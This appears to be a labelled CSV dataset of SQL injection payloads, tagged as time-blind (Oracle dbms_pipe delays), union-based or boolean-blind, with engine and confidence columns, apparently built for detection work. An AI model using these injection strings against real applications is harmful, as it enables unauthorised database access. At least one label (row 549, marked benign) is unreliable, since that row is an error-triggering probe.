id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
408,"1%' or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and '%' = '",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
463,"1 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) -- kfqs",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
491,"1"" ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ""nbfe"" = ""nbfe",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
527,"1' ) as ibqr where 5372 = 5372 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
464,"1'|| ( select 'wyng' from dual where 2157 = 2157 union all select null,null--",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2
549,"iif ( 3204 = 8489,3204,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 28 chars.,2
400,-7562 ) or 8571 = 8571--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,2
401,"-3707"" ) ) ) or 8571 = 8571--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 29 chars.,2
407,-8665' or 6825 = 7840 and 'vbsy' like 'vbsy,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 43 chars.,2
411,"1%"" ) ) and 7533 = 7533 and ( ( ""%"" = """,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 39 chars.,2
412,-3834' ) ) as hhiy where 2086 = 2086 or 3038 = 3038,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 51 chars.,2
413,"-7371' ) union all select 4531,4531,4531#",union_based,generic,0.7,UNION-based payload detected. Payload length: 41 chars.,2
422,"1' union all select null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 41 chars.,2
423,"-3596' ) union all select 5349,5349,5349,5349,5349,5349#",union_based,generic,0.7,UNION-based payload detected. Payload length: 56 chars.,2
425,"-4670"" ) ) or 3038 = 3038",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2
427,1' ) where 2753 = 2753 and ( 2739 = 8047 ) *8047--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,2
428,-3921' ) as audo where 7087 = 7087 or 1755 = 4937--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 51 chars.,2
429,"-2072"" ) as rjcz where 2491 = 2491 or 6872 = 6872--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 51 chars.,2
432,-7187' or 4159 = 7465,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
438,"-7813"" ) ) as yvyl where 5172 = 5172 union all select 5172,5172#",union_based,generic,0.7,UNION-based payload detected. Payload length: 64 chars.,2
442,-5918' ) as olzc where 5992 = 5992 or 4390 = 9085,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 49 chars.,2
443,"-9795 ) as wrgs where 5427 = 5427 union all select 5427,5427,5427,5427,5427,5427--",union_based,generic,0.7,UNION-based payload detected. Payload length: 82 chars.,2
447,"1'+ ( select 'rryx' where 1228 = 1228 union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 100 chars.,2
449,"1 ) as biup where 1414 = 1414 union all select null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 87 chars.,2
450,"-5827"" ) as lskq where 7683 = 7683 union all select 7683,7683,7683,7683,7683#",union_based,generic,0.7,UNION-based payload detected. Payload length: 77 chars.,2
452,"-3697' ) ) ) union all select 5180,5180,5180,5180,5180,5180,5180--",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
454,1' and 5967 = 4184#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 19 chars.,2
461,"-9514 ) ) as xdkw where 4975 = 4975 union all select 4975,4975,4975,4975#",union_based,generic,0.7,UNION-based payload detected. Payload length: 73 chars.,2
462,"1 union all select null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 29 chars.,2
470,"-1065 ) ) union all select 7437,7437,7437,7437,7437,7437,7437,7437--",union_based,generic,0.7,UNION-based payload detected. Payload length: 68 chars.,2
473,"1' ) where 6672 = 6672 union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 91 chars.,2
476,"1%"" ) ) ) and 7533 = 7533 and ( ( ( ""%"" = """,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 43 chars.,2
478,"-3391' union all select 2024,2024--",union_based,generic,0.7,UNION-based payload detected. Payload length: 35 chars.,2
480,"-3829%"" ) union all select 2218,2218,2218,2218,2218,2218,2218--",union_based,generic,0.7,UNION-based payload detected. Payload length: 63 chars.,2
481,"-8629 where 8049 = 8049 union all select 8049,8049,8049,8049,8049,8049,8049#",union_based,generic,0.7,UNION-based payload detected. Payload length: 76 chars.,2
482,"-3279"" union all select 8568,8568,8568,8568--",union_based,generic,0.7,UNION-based payload detected. Payload length: 45 chars.,2
485,-3598 ) union all select 2264#,union_based,generic,0.7,UNION-based payload detected. Payload length: 30 chars.,2
487,"-8982' in boolean mode ) union all select 5367,5367,5367,5367,5367,5367#",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
488,1' ) and 9198 = 9198--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
493,"1' where 7104 = 7104 union all select null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 73 chars.,2
497,-5137 ) or 9323 = 9323#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
498,"-1184"" ) ) ) union all select 1482--",union_based,generic,0.7,UNION-based payload detected. Payload length: 36 chars.,2
499,"-6158"" ) union all select 3084,3084,3084,3084,3084,3084#",union_based,generic,0.7,UNION-based payload detected. Payload length: 56 chars.,2
503,"-9859"" ) ) ) union all select 6595,6595,6595,6595,6595,6595,6595#",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
